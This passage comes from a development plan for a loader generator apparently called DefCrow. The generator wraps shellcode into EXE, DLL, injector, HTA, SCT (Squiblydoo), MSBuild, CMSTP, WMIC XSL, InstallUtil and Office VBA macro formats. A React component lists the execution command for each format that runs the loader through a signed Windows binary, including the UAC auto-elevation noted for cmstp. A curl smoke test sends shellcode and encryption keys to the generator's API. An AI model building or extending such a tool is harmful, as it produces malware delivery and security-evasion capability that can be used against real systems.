  | 'Wsf' | 'Hta' | 'Regsvr32Sct' | 'MsBuild' | 'Cmstp' | 'WmicXsl'
  | 'DocxMacro' | 'XlsxMacro' | 'InstallUtil'

export const LOADER_GROUPS: Record<string, { type: LoaderType; label: string; ext: string }[]> = {
  'PE Compiled': [
    { type: 'Binary',      label: 'Binary',      ext: '.exe' },
    { type: 'Dll',         label: 'DLL',         ext: '.dll' },
    { type: 'AppDomain',   label: 'AppDomain',   ext: '.dll + .config' },
    { type: 'Injector',    label: 'Injector',    ext: '.exe' },
    { type: 'Rundll32',    label: 'Rundll32',    ext: '.dll' },
  ],
  'Script LOLBIN': [
    { type: 'Wsf',         label: 'WSF',         ext: '.wsf' },
    { type: 'Hta',         label: 'HTA',         ext: '.hta' },
    { type: 'Regsvr32Sct', label: 'Squiblydoo',  ext: '.sct' },
    { type: 'MsBuild',     label: 'MSBuild',     ext: '.csproj' },
    { type: 'Cmstp',       label: 'CMSTP',       ext: '.inf' },
    { type: 'WmicXsl',     label: 'WMIC XSL',    ext: '.xsl' },
  ],
  'Office Macro': [
    { type: 'DocxMacro',   label: 'Word VBA',    ext: '.bas (paste in Word)' },
    { type: 'XlsxMacro',   label: 'Excel VBA',   ext: '.bas (paste in Excel)' },
  ],
  '.NET LOLBIN': [
    { type: 'InstallUtil', label: 'InstallUtil', ext: '.dll' },
  ],
}
```

- [ ] **Step 2: Create ExecHint component**

```tsx
// frontend/src/components/ExecHint.tsx
import { LoaderType } from '../api/generate'

const HINTS: Record<LoaderType, { cmd: string; signer: string; note?: string }> = {
  Binary:      { cmd: 'loader.exe',                                              signer: '(unsigned by default)' },
  Dll:         { cmd: 'rundll32 loader.dll,DllMain',                             signer: 'rundll32.exe' },
  Rundll32:    { cmd: 'rundll32 loader.dll,EntryPoint',                          signer: 'rundll32.exe' },
  AppDomain:   { cmd: 'Place loader.dll + .config near host .exe',               signer: 'Host process (.NET)' },
  Injector:    { cmd: 'loader.exe <target.exe>',                                 signer: '(unsigned by default)' },
  Wsf:         { cmd: 'wscript.exe loader.wsf',                                  signer: 'wscript.exe' },
  Hta:         { cmd: 'mshta.exe loader.hta',                                    signer: 'mshta.exe' },
  Regsvr32Sct: { cmd: 'regsvr32 /u /s /n /i:loader.sct scrobj.dll',              signer: 'regsvr32.exe (Squiblydoo)' },
  MsBuild:     { cmd: 'MSBuild.exe loader.csproj',                               signer: 'MSBuild.exe' },
  Cmstp:       { cmd: 'cmstp.exe /au loader.inf',                                signer: 'cmstp.exe (auto-elevates UAC)' },
  WmicXsl:     { cmd: 'wmic os get /format:"loader.xsl"',                        signer: 'wmic.exe' },
  DocxMacro:   { cmd: 'Open Word → Alt+F11 → ThisDocument → paste → save .docm', signer: 'WINWORD.EXE',
                 note: 'Output is plain .bas text — copy-paste into Office VBA editor manually' },
  XlsxMacro:   { cmd: 'Open Excel → Alt+F11 → ThisWorkbook → paste → save .xlsm', signer: 'EXCEL.EXE',
                 note: 'Output is plain .bas text — copy-paste into Office VBA editor manually' },
  InstallUtil: { cmd: 'installutil.exe /logfile= /LogToConsole=false /U loader.dll', signer: 'installutil.exe' },
}

export default function ExecHint({ type }: { type: LoaderType }) {
  const h = HINTS[type]
  return (
    <div className="rounded-xl p-4 mt-4"
      style={{ backgroundColor: 'rgba(124,58,237,0.06)', border: '1px solid rgba(124,58,237,0.3)' }}>
      <p className="text-xs uppercase tracking-widest mb-2" style={{ color: '#7c3aed' }}>Execution Command</p>
      <pre className="text-xs font-mono mb-2 whitespace-pre-wrap" style={{ color: '#e2e8f0' }}>{h.cmd}</pre>
      <p className="text-xs" style={{ color: '#64748b' }}>Signed by: <span style={{ color: '#e2e8f0' }}>{h.signer}</span></p>
      {h.note && <p className="text-xs mt-1" style={{ color: '#fbbf24' }}>⚠ {h.note}</p>}
    </div>
  )
}
```

- [ ] **Step 3: Update GeneratorPage**

Replace the existing 4-button loader type grid with grouped grid using `LOADER_GROUPS`. Add `<ExecHint type={loaderType} />` below the loader type section.

- [ ] **Step 4: Update tests for new types + commit**

```bash
cd frontend && npx vitest run
git commit -am "feat(frontend): expanded loader type selector + ExecHint component"
```

---

### Task 10: Final verification

- [ ] **Step 1: All tests pass**

```bash
cargo test --workspace 2>&1 | tail -10
cd frontend && npx vitest run 2>&1 | tail -5
```

- [ ] **Step 2: Build succeeds**

```bash
cargo check --workspace 2>&1 | tail -5
cd frontend && npm run build 2>&1 | tail -5
```

- [ ] **Step 3: Smoke test each type via CLI**

```bash
# Once server runs, hit /api/generate with each loader_type and verify output file is created
for t in Wsf Hta Regsvr32Sct MsBuild Cmstp WmicXsl DocxMacro XlsxMacro; do
  curl -sX POST localhost:8080/api/generate \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"loader_type\":\"$t\",\"features\":[],\"encryption\":\"Aes256\",\"shellcode_hex\":\"90\",\"key_hex\":\"aa\",\"iv_hex\":\"bb\"}"
done
```

- [ ] **Step 4: Final commit**

```bash
git commit -am "feat: DefCrow Plan 4 complete — 10 new LOLBIN output types"
```

---

## Summary

After all 10 tasks:
- DefCrow now supports 14 total loader output types (4 original + 10 new)
- All script types render in <100ms (no rustc)
- VBA Word/Excel macro outputs as .bas text for manual paste
- InstallUtil compiles via csc.exe / mcs (server requires .NET SDK or mono)
- Frontend shows categorized selector + exec command hints
